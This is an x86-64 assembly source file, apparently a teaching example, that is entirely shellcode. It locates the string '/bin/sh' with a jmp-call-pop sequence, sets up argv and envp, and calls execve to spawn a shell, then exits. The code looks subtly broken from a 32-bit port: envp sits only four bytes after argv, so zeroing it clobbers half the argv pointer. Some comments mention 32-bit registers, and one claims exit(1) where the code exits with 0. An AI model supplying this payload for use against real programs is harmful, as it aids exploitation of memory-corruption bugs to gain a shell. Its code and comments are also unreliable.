#include <sys/syscall.h>

#define STRING  "/bin/sh"
#define STRLEN  7
#define ARGV    (STRLEN+1)
#define ENVP    (ARGV+4)

.globl main
.type  main, @function

main:
  jmp     calladdr

popladdr:
  popq    %rbx                    /* esi points to STRING */
  movq    %rbx,(ARGV)(%rbx)       /* set up argv pointer to pathname */
  xorq    %rax,%rax               /* get a 32-bit zero value */
  movb    %al,(STRLEN)(%rbx)      /* null-terminate our string */
  movq    %rax,(ENVP)(%rbx)       /* set up null envp */
  
  movb    $SYS_execve,%al         /* syscall number */
  movq    %rbx,%rdi               /* arg 1: string pathname */
  leaq    ARGV(%rbx),%rsi         /* arg 2: argv */
  leaq    ENVP(%rbx),%rdx         /* arg 3: envp */
  syscall                         /* invoke syscall */
  
  xorq    %rdi,%rdi
  xorq    %rax,%rax               /* exit(1) */
  movb    $SYS_exit,%al
  syscall                         /* invoke syscall */

calladdr:
  call    popladdr
  .string STRING
